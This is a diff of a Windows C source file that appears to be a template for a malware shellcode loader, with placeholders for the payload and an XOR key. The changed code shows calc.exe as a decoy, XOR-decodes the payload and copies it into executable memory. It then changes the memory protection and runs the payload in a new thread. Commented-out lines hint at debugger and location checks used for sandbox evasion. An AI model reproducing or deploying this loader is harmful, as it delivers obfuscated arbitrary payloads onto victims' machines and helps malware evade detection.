@@ -1,9 +1,10 @@
 #include <windows.h>
 #include <stdio.h>
 
-__attribute__((section(".text"))) unsigned char msgbox_payload[] = "%SHELLCODE%";
+
 void main() {
     ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
+
     // int is_debugged = d();
     // int size = z();
     // char *hostname = h();
@@ -12,22 +13,31 @@ void main() {
     // printf("hostname: %s\n", hostname);
     // printf("size: %d\n", size);
     // printf("country: %s\n", country);
-
-    size_t ss = sizeof(msgbox_payload);
+    
+    unsigned char payload[] = "%SHELLCODE%";
+    void* exec;
+    BOOL rv;
+    HANDLE th;
+    DWORD old_protect;
 
     
     // Allocating executable memory
-    void *exec_mem = VirtualAlloc(NULL, ss, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-    // Copy shellcode into allocated memory
-    memcpy(exec_mem, msgbox_payload, ss);
+    exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     // XORing shellcode
-    for (size_t i = 0; i < ss; i++) {
-        ((unsigned char*)exec_mem)[i] ^= %XOR_KEY%;
+    for (size_t i = 0; i < sizeof(payload); i++) {
+        payload[i] ^= %XOR_KEY%;
     }
     
-    // jump on it
-    ((void (*)())exec_mem)();
+    // Copy shellcode into allocated memory
+    memcpy(exec, payload, sizeof(payload));
+
+    // Changing memory protection to PAGE_EXECUTE_READ
+    rv = VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
+
+    // Executing shellcode in a new thread
+    th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
+
+    WaitForSingleObject(th, -1);
 }
 
